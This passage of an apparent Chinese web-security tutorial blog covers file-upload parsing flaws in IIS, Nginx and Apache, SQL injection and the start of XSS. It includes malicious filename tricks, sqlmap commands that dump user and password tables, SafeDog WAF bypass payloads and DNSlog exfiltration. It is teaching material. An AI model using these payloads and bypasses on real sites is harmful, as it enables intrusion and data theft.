6.0中存在以下两个解析漏洞：</p><blockquote><p>（1）<strong>目录解析漏洞</strong></p><p>在网站中建立名字为*.asp或.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p><p>例如：创建一个目录test.asp，那么&#x2F;test.asp&#x2F;1.jpg将被当做ASP文件来执行。（<code>/xx.asp/xx.jpg</code>）</p><p>（2）<strong>文件解析漏洞</strong></p><p>网站上传图片的时候，如果将网页木马文件的名字改成<code>*.asp;1.jpg</code>，分号后面的不被解析，也就是说，<code>*.asp;1.jpg</code>会被服务器看成是<code>*.asp</code>，就可以绕过服务器禁止上传ASP文件的限制，这样的畸形文件也同样会被IIS当做ASP文件来解析并执行。</p><p>例如：上传一个图片文件名为<code>test.asp;1.jpg</code>的木马文件，该文件可以被当做ASP文件解析并执行。<br>在IIS6.0版本中，默认可执行文件除了<code>test.asp</code>以外，还包括<code>test.asa</code>、<code>test.cer</code>、<code>test.cdx</code>这三种，同样也存在解析漏洞。</p></blockquote><p><strong>plus：</strong></p><p>asp.dll代码的大致流程：</p><p>1、请求<code>test.asp;1.jpg</code></p><p>2、从头查找<code>.</code>号，获得<code>.asp;1.jpg</code> </p><p>3、找到<code>;</code>号，如果有，则内存截断</p><p>4、找到<code>/</code>号，如果有，则内存截断</p><p>5、最终，将保留下来<code>.asp</code>字符串</p><ul><li><strong>IIS 7.0&#x2F;IIS 7.5 || Nginx解析漏洞</strong></li></ul><p>IIS 7.0&#x2F;IIS 7.5或Nginx在使用FastCGI方式调用php时，在<code>php.ini</code>里设置<code>cgi.fix_pathinfo=1</code>，这使得访问任意文件URL时，在URL后面添加<code>/x.php</code>等字符时，该文件被IIS当成<code>php文件代码</code>解析。</p><p>在某些使用有漏洞的网站中，访问<code>http://127.0.0.1/1.jpg/1.php</code>，此时的1.jpg会被当作<code>PHP脚本</code>来解析,而<code>1.php本身是不存在的</code>。</p><p>这就意味着攻击者可以上传合法的“图片”（<code>图片木马</code>），然后在URL后面加上<code>/xxx.php</code>，就可以获得网站的WebShell，然后再使用中国菜刀连接即可。</p><blockquote><p>原因：当FastCGI在处理<code>.php</code>文件时发现文件并不存在，这时php.ini配置文件中<code>cgi.fix_pathinfo=1</code>发挥作用,这项配置用于修复路径,如果当前路径不存在则<code>采用上层路径</code>。PHP会认为SCRIPT_FILENAME是1.jpg，而1.php是PATH_INFO，然后PHP 就把1.jpg当作一个PHP文件来解释执行。</p></blockquote><ul><li><strong>Nginx 空字节代码执行漏洞</strong></li></ul><p>影响版本：0.5 ,0.6 , 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37</p><p>当使用<code>PHP-FastCGI</code>执行PHP时，遇到url里面存在%00空字节时与<code>FastCGI</code>的处理不一致，导致可<code>在非PHP文件中嵌入PHP代码</code>，通过访问<code>url + %00.PHP</code>来执行其中的PHP代码。</p><blockquote><p>例如：<code>http://127.0.0.1/1.jpg%00.php</code>会把1.jpg文件（木马文件）当做PHP文件来执行。</p><p>利用：xxx.jpg%00.php</p></blockquote><ul><li><strong>apache解析漏洞</strong></li></ul><p><strong>漏洞原理</strong></p><p>Apache 解析文件的规则是：<code>从右到左</code>开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar2 ,“.owf”和”.rar2” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php文件。</p><p>注意~！尽管上传如此命名的文件<code>www.xxxx.xxx.com/test.php.xxx.yyy</code>会因为一些不可识别文件解析后缀而被交给php处理，但是有可能我们去访问时，发现文件并没有被解析，这是因为apache本身根本不存在所谓的解析漏洞，最后一步虽然交给了php来处理文件，但是php也不认识那些不可识别文件解析后缀，因此会以DefaultType的默认值“text&#x2F;plain”来当作文本解析。</p><p><strong>配置问题导致的漏洞</strong></p><p>（1）如果在 Apache 的 conf 里有这样一行配置<code> AddHandler php5-script .php</code> 这时,只要文件名里包含<code>.php </code>,即使文件名是 test2.php.jpg , 也会以 php 来执行。</p><p>（2）如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg </code>即使扩展名是 jpg，一样能以 php 方式执行。</p><blockquote><p>解析漏洞的产生，是由于运维人员在配置服务时，为了使apache服务器能解析php，而自己添加一个handle，</p><p>例如：<code>AddType application/x-httpd-php.php</code>，它的作用也是为了让apache把php文件交给php_module解析。但是注意到它与<code>SetHandler：</code>的后缀不是用正则去匹配的，所以，在文件名的任何位置匹配到php后缀，它都会让php_module解析。</p></blockquote><p><strong>apache换行解析漏洞</strong></p><p>影响版本：2.4.0~2.4.29 （CVE-2017-15715）</p><p>此漏洞的出现是由于 apache 在<code>修复第一个后缀名解析漏洞</code>时，用<code>正则</code>来<code>匹配后缀</code>。在解析php时xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p><h4 id="7、漏洞危害以及修复建议"><a href="#7、漏洞危害以及修复建议" class="headerlink" title="7、漏洞危害以及修复建议"></a>7、漏洞危害以及修复建议</h4><ul><li><strong>漏洞危害</strong></li></ul><p>1、文件上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本、可执行程序等。</p><p>2、如果web 服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致网站沦陷。</p><p>3、如果攻击者通过其他漏洞进行提权操纵，拿到系统管理权限，那么直接导致服务器沦陷。</p><p>4、同服务器下的其他网站无一幸免，均会被攻击者控制。</p><ul><li><strong>修复建议</strong></li></ul><p>1、对上传的文件在服务器上存储时进行重命名</p><p>2、检查上传文件的类型和大小</p><p>3、禁止上传危险的文件类型，如jsp jar war等</p><p>4、只接受指定类型的文件</p><h3 id="⑧反序列化漏洞"><a href="#⑧反序列化漏洞" class="headerlink" title="⑧反序列化漏洞"></a>⑧反序列化漏洞</h3><h4 id="1、先验知识-2"><a href="#1、先验知识-2" class="headerlink" title="1、先验知识"></a>1、先验知识</h4>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
      <tag>渗透流程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础漏洞（一）之SQL注入、XSS、SSRF、CSRF</title>
    <link href="/2024/08/02/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%E3%80%81CSRF/"/>
    <url>/2024/08/02/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%E3%80%81CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h1><h2 id="①SQL注入"><a href="#①SQL注入" class="headerlink" title="①SQL注入"></a>①SQL注入</h2><blockquote><p>SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。</p></blockquote><h3 id="1、先验知识"><a href="#1、先验知识" class="headerlink" title="1、先验知识"></a>1、先验知识</h3><ul><li><h5 id="Mysql的三种注释风格："><a href="#Mysql的三种注释风格：" class="headerlink" title="Mysql的三种注释风格："></a>Mysql的三种注释风格：</h5></li></ul><blockquote><p>单行注释：<code>#</code>后面直接添加注释内容</p><p>​  <code>--</code>后面直接添加注释内容</p><p>多行注释：<code>/*中间可跨行*/</code>于中间添加注释内容</p><p>内联注释：MySql为了保持于其它数据库兼容，避免从mysql中导出的sql语句不能被其它数据库使用。它将mysql中特有的语句放在了<code>/*！content*/</code>中，这些语句在不兼容的数据库中使用时便不会被执行，而mysql自身却能识别。</p><p>在SQL注入中，内联注释常用来绕过waf。</p></blockquote><ul><li><h5 id="Union联合查询："><a href="#Union联合查询：" class="headerlink" title="Union联合查询："></a>Union联合查询：</h5></li></ul><blockquote><p>Union操作符用于拼接两个或者多select查询语句</p><p>Union中的每个查询必须拥有相同的列数</p></blockquote><ul><li><h5 id="Order-by语句："><a href="#Order-by语句：" class="headerlink" title="Order by语句："></a>Order by语句：</h5></li></ul><blockquote><p>Order by语句用于根据指定的列对结果集进行排序</p><p>默认按照升序对记录进行排序</p></blockquote><ul><li><h5 id="SQL注入中常用的Mysql语句："><a href="#SQL注入中常用的Mysql语句：" class="headerlink" title="SQL注入中常用的Mysql语句："></a>SQL注入中常用的Mysql语句：</h5></li></ul><blockquote><p>user()当前用户名</p><p>database()当前所有数据库</p><p>current_user()当前用户名（可用来查看权限）</p><p>version()数据库版本</p><p>@@datadir数据库路径</p><p>load_file()读文件操作</p><p>into outfile() &#x2F; into dumpfile()写文件操作</p></blockquote><ul><li><h5 id="sql注入读写文件的条件"><a href="#sql注入读写文件的条件" class="headerlink" title="sql注入读写文件的条件"></a>sql注入读写文件的条件</h5></li></ul><blockquote><p>数据库允许导入导出（secure_file_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br></code></pre></td></tr></table></figure><p>当前用户文件操作权限（File_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> File_priv from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><ul><li><h5 id="SQL注入漏洞的判断依据"><a href="#SQL注入漏洞的判断依据" class="headerlink" title="SQL注入漏洞的判断依据"></a>SQL注入漏洞的判断依据</h5></li></ul><blockquote><p>构建测试语句</p><p>提交请求</p><p>分析返回结果</p><p>①符合预期结果，则存在SQL注入漏洞</p><p>②不符合预期结果，则可以判断为不存在SQL注入漏洞，当然也可以再次构造测试语句进行进一步的测试。</p></blockquote><ul><li><h5 id="SQL注入漏洞的类型"><a href="#SQL注入漏洞的类型" class="headerlink" title="SQL注入漏洞的类型"></a>SQL注入漏洞的类型</h5></li></ul><blockquote><p>通常分为两种：数字型、字符型</p></blockquote><h3 id="2、SQL注入技术"><a href="#2、SQL注入技术" class="headerlink" title="2、SQL注入技术"></a>2、SQL注入技术</h3><blockquote><p>主要分为三种注入技术：</p><ul><li>基于报错注入（Error-based）</li><li>基于Union联合查询注入</li><li>基于盲注（Bind SQL injection）</li></ul></blockquote><ul><li><h5 id="基于报错注入（Error-based）"><a href="#基于报错注入（Error-based）" class="headerlink" title="基于报错注入（Error-based）"></a>基于报错注入（Error-based）</h5></li></ul><p><code>用法</code>：构造错误的SQL命令将注入信息在数据库错误信息中显示出来。</p><p><code>条件</code>：需要根据不同数据库的错误处理机制以及脚本语言错误处理机制构造。</p><p><code>注意</code>：有字节数限制，可将注入的字符串信息拆分显示。</p><p><code>特点</code>：效率高。</p><ul><li><h5 id="基于Union联合查询注入"><a href="#基于Union联合查询注入" class="headerlink" title="基于Union联合查询注入"></a>基于Union联合查询注入</h5></li></ul><p><code>用途</code>：用于合并两个或多个select语句的结果集。</p><p><code>用法</code>：<code>union select column_name(s) from table_name1</code></p><p><code>注意</code>：union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。默认union操作符选取不同的值。(如果允许重复的值，则使用<code>union all</code>)</p><p><code>特点</code>：效率高，可一次批量查询大量数据。</p><ul><li><h5 id="基于盲注（Bind-SQL-injection）"><a href="#基于盲注（Bind-SQL-injection）" class="headerlink" title="基于盲注（Bind SQL injection）"></a>基于盲注（Bind SQL injection）</h5></li></ul><p><code>用途</code>：在无法通过显示位和错误信息获取目标数据时，根据注入语句返回的true、false的结果页面不同暴力猜解目标数据。</p><p><code>用法</code>：<code>使用条件语句，如 if 、 case when等</code></p><p><code>特点</code>：暴力猜解，速度慢，效率低。</p><h3 id="3、SQL注入实操"><a href="#3、SQL注入实操" class="headerlink" title="3、SQL注入实操"></a>3、SQL注入实操</h3><p><a href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细)</a></p><p><a href="https://www.cnblogs.com/dhan/p/18290502">SQL注入基础入门-详细</a></p><h5 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h5><blockquote><p>有个注意的点：url后面必须是可注入的参数?id&#x3D;之类的，否则url检测会有问题。</p></blockquote><ul><li><strong>单引号判断法：</strong></li></ul><p>在参数（通常为网页URL）后面加上单引号（英文），重新加载网页。</p><blockquote><p>如果页面返回错误，则表示存在SQL注入。（无论是字符型还是整型都会因为单引号个数不匹配而报错）</p><p>如果未报错，也无法断定不存在SQL注入。（可能页面对单引号设置了过滤，此时可以使用判断语句进行注入）</p></blockquote><h5 id="SQL注入类型判断"><a href="#SQL注入类型判断" class="headerlink" title="(SQL注入类型判断)"></a>(SQL注入类型判断)</h5><ul><li><strong>数字型判断</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为整型时，通常在abc.php中的这种类型可以使用经典的<code>and 1=1</code>和<code>and 1=2</code>来进行判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>，若网页页面依旧运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=2</code>，页面运行错误，则说明此SQL注入为数字型注入。（换言之，如果仍然正常说明不是数字型SQL注入）</p></blockquote><ul><li><strong>字符型注入</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为字符型时，同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;1</code>时，如果网页页面运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;2</code>时，页面运行错误，则说明此SQL注入为字符型注入。</p></blockquote><ul><li><strong>sqlmap注入判断</strong></li></ul><p>当前面三种注入判断方法都尝试过，并且显示的界面都是正常的时候。此时我们仍无法断定其不存在SQL注入，可以再使用sqlmap进行扫描测试，如果再扫不出注入口的话，那有九成把握断定其不存在SQL注入。</p><p><a href="https://www.cnblogs.com/yy-123/p/16749289.html">SQLMap入门——判断是否存在注入</a></p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582981.html">sqlmap使用手册（更直白款）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有表名</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取当前库名</span><br>sqlmap -u url --current-db<br><br><span class="hljs-comment"># 获取当前连接数据库的用户名    </span><br>sqlmap -u url --current-user<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D security --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure><h3 id="4、绕过安全狗（防SQL注入功能）"><a href="#4、绕过安全狗（防SQL注入功能）" class="headerlink" title="4、绕过安全狗（防SQL注入功能）"></a>4、绕过安全狗（防SQL注入功能）</h3><p>什么是安全狗？</p><blockquote><p>安全狗是一种网络安全服务，主要用于网站的防护和安全监测。具体来说，网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马&#x2F;木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p></blockquote><p><a href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a></p><p>由于安全狗是一款常用于网站安全保护的服务器工具，其包含了防SQL注入的功能。绕过安全狗的防SQL注入功能，顾名思义，便能够执行SQL注入了。</p><p>那么如果绕过安全狗中的防SQL注入模块呢？</p><blockquote><p>一般来说，安全狗不会对POST请求做检测，如果POST请求也被拦截的话，那就可以尝试进行分块传输。</p></blockquote><h4 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h4><p>内联注释符：<code>/*!...*/</code></p><p>绕过思路：</p><p>· 首先使用常规判断注入的方法（and 1&#x3D;1 或其它）判断类型。</p><p>· 如果被拦截，使用非·常规判断方法（and -1&#x3D;-1–+ 后面的<code>--+</code>是注释符）判断类型。</p><p>· 如果还是被拦截，那基本可以判断为<code>安全狗一般都会拦截 and+一些组合语句 </code>，</p><p>· 接下来可以使用<code>四则运算</code>判断，<code>/1返回正常页面，/0返回异常页面，则表示其为数字型注入</code>，如果是数字型注入的话，尝试使用<code>order by</code>绕过：</p><blockquote><p>输入：%20&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F;%20&#x2F;<em><strong><strong>!23144by</strong></strong></em>&#x2F;%201–+</p><p>%20表示空格</p><p>实际显示： &#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F; &#x2F;*****!23144by*&#x2F; 1–+</p></blockquote><blockquote><p>字符型绕过：</p><p><code>1&#39;/case when 1=1 then &#39;1&#39; else &#39;0&#39; end--+ </code></p><p><code>1&#39;/case when 1=1 then 1 else 0 end--+</code></p></blockquote><p>· 如果被拦截了，尝试使用<code>if</code>语句：</p><blockquote><p>if(1&#x3D;1,1,0)</p><p>if(1&#x3D;0,1,0)</p></blockquote><p>如果条件为真页面返回正常，注入成功，为假页面返回异常的话。那就表明if语句绕过成功了。</p><p>· 先判断数据库长度：<code>if(length(database())&gt;0,1,0)</code></p><p>· 若被拦截，使用字符替换其中的<code>database()</code>验证是否是该函数被拦截。<code>if(length(&#39;abc&#39;)&gt;0,1,0)</code></p><p>· 若返回页面正常，则表示是其中的<code>database()</code>被拦截</p><p>· 使用<code>内联绕过</code>：<code>if(length(/*!06440database*/())%3E0,1,0)</code>其中，<code>%3E</code>表示<code>&gt; </code>符号，将函数名使用内联注释符框住，执行。</p><p>· 正常来说，如此便会成功绕过。（不会被拦截啦）</p><p>· 之后就是执行参数污染等操作了：</p><blockquote><p><code>/**&amp;id=-1 union select 1,2,3#*/ </code></p><p><code>/**-1 union select 1,2,3#*/ </code></p><p><code>/***/</code></p></blockquote><h3 id="5、DNS外带SQL注入（属于mysql盲注）"><a href="#5、DNS外带SQL注入（属于mysql盲注）" class="headerlink" title="5、DNS外带SQL注入（属于mysql盲注）"></a>5、DNS外带SQL注入（属于mysql盲注）</h3><p>使用场景：无法通过联合查询直接获取数据的情况下，注入时无回显时，可尝试使用 DNSlog 外带注入。</p><p>用途：用于在SQL注入攻击中绕过防火墙和安全措施，以获取更多的信息。</p><p>利用条件：①DNSlog外带要用到 Load_file()函数，需要当前数据库用户有读权限。②设置 <code>secure_file_priv</code>为空。查询权限的语句为：<code>select file_priv from mysql.user where user=&#39;&#39;</code></p><blockquote><p>DNSlog注入的原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为<code>summer.com</code>，要使用的payload为<code>whoami.summer.com</code>，就可以通过DNS解析日志来获取到主机名。</p></blockquote><p><a href="https://www.freebuf.com/articles/web/323674.html">mysql盲注之dns外带注入</a></p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操</a></p><h3 id="6、sqlmap使用"><a href="#6、sqlmap使用" class="headerlink" title="6、sqlmap使用"></a>6、sqlmap使用</h3><p>先验知识：</p><blockquote><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p></blockquote><p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南</a></p><p><a href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">SQLmap使用教程图文教程</a></p><p>常用表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a, --all           检索所有内容<br>   -b, --banner        检索DBMS横幅<br>   --current-user      检索DBMS当前用户<br>   --current-db        检索DBMS当前数据库<br>   --hostname          检索DBMS服务器主机名<br>   --is-dba            检测DBMS当前用户是否为DBA<br>   --<span class="hljs-built_in">users</span>             枚举DBMS用户<br>   --passwords         枚举DBMS用户密码哈希值<br>   --privileges        枚举DBMS用户权限<br>   --roles             枚举DBMS用户角色<br>   --dbs               枚举DBMS数据库<br>   --tables            枚举DBMS数据库表<br>   --columns           枚举DBMS数据库表列<br>   --schema            枚举DBMS模式<br>   --count             检索表的条目数<br>   --dump              转储DBMS数据库表条目<br>   --dump-all          转储所有DBMS数据库表条目<br>   --search            搜索列、表和/或数据库名称<br>   --comments          在枚举过程中检查DBMS注释<br>   --statements        检索在DBMS上运行的SQL语句<br>   -D DB               要枚举的DBMS数据库<br>   -T TBL              要枚举的DBMS数据库表<br>   -C COL              要枚举的DBMS数据库表列<br>   -X EXCLUDE          不要枚举的DBMS数据库标识符<br>   -U USER             要枚举的DBMS用户<br>   --exclude-sysdbs    在枚举表时排除DBMS系统数据库<br>   --pivot-column=P..  枢轴列名称<br>   --<span class="hljs-built_in">where</span>=DUMPWHERE   在转储表时使用WHERE条件<br>   --start=LIMITSTART  要检索的第一个转储表条目<br>   --stop=LIMITSTOP    要检索的最后一个转储表条目<br>   --first=FIRSTCHAR   要检索的第一个查询输出单词字符<br>   --last=LASTCHAR     要检索的最后一个查询输出单词字符<br>   --sql-query=SQLQ..  要执行的SQL语句<br>   --sql-shell         提示进行交互式SQL shell<br>   --sql-file=SQLFILE  从给定文件中执行SQL语句<br><br></code></pre></td></tr></table></figure><h2 id="②XSS跨站脚本攻击"><a href="#②XSS跨站脚本攻击" class="headerlink" title="②XSS跨站脚本攻击"></a>②XSS跨站脚本攻击</h2><h3 id="1、漏洞简介"><a href="#1、漏洞简介" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><ul><li><p>XSS，跨站脚本攻击，是指恶意攻击者网<code>web页面</code>中<code>插入恶意代码</code>，当用户<code>浏览该网页时</code>，嵌入其中的恶意代码就会被执行，从而达到攻击者的目的。</p></li><li><p>XSS属于被动攻击。最大的特点是，能注入恶意的html&#x2F;JavaScript代码到用户浏览的网页上，从而达到的挟持用户会话的目的。</p></li><li><p>危害：窃取用户&#x2F;管理员的cookie非法登陆；网站挂马（将恶意木马代码插入到web页面中，用户访问页面目标计算机就会被植入木马）；发送广告或垃圾信息。</p></li></ul><h3 id="2、漏洞类型"><a href="#2、漏洞类型" class="headerlink" title="2、漏洞类型"></a>2、漏洞类型</h3><p><strong>主要分为三种类型：</strong></p><h4 id="反射类XSS（非持久型XSS）"><a href="#反射类XSS（非持久型XSS）" class="headerlink" title="反射类XSS（非持久型XSS）"></a>反射类XSS（非持久型XSS）</h4><p>攻击者需要通过<code>诱使用户点击</code>包含XSS攻击代码的恶意链接，接着用户方的浏览器就会执行恶意代码触发XSS漏洞。</p><p>· 利用：常见的利用方法是在URL中构造，将恶意链接发送给目标用户。（当用户访问该链接时，其浏览器会向服务器发起一个GET请求来提交带有恶意代码的链接，在浏览器中解析）</p><p>· 一般情况下，反射性XSS存在于搜索框，<code>通过URL控制页面的输出</code>。简而言之为，将参数传入服务器，再由服务器输出出来。</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>攻击者需要事先将javascript<code>代码上传或存储</code>到存在漏洞的服务器中。当受害者浏览包含此恶意Javascript代码的页面时便会触发恶意代码。</p><p>· 利用：需要将恶意代码上传至服务器中。</p><p><a href="https://blog.csdn.net/weixin_45842420/article/details/123450070">本地代码上传到服务器</a></p><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>它是一种特殊的反射型XSS。</p><p>· DOM树，文档对象模型，web前端开发中常使用到的模型。</p><p>· 主要由客户端的脚本程序通过DOM动态地输出数据到页面，而非依赖于将数据提交给服务器端。明白说来是，js脚本从url中获取数据并将其传递到<code>支持动态代码执行的接收器</code>时，就会产生DOM-XSS漏洞。咦？DOM-XSS一般产生于<code>用户能够进行参数输入查询的地方</code>（比如搜索框捏）。</p><p>· 常见的接收器：</p><blockquote><p>document.write()<br>document.writeln()<br>document.domain<br>someDOMElement.innerHTML<br>someDOMElement.outerHTML<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p></blockquote><p>· 演示范例：<a href="https://blog.csdn.net/vodkaDL/article/details/111570321">Web渗透测试之XSS攻击：基于DOM的XSS</a></p><p><a href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p><h3 id="3、常用XSS语句"><a href="#3、常用XSS语句" class="headerlink" title="3、常用XSS语句"></a>3、常用XSS语句</h3><p><a href="https://www.cnblogs.com/xfbk/p/17936998">XSS注入测试思路+通用语句</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 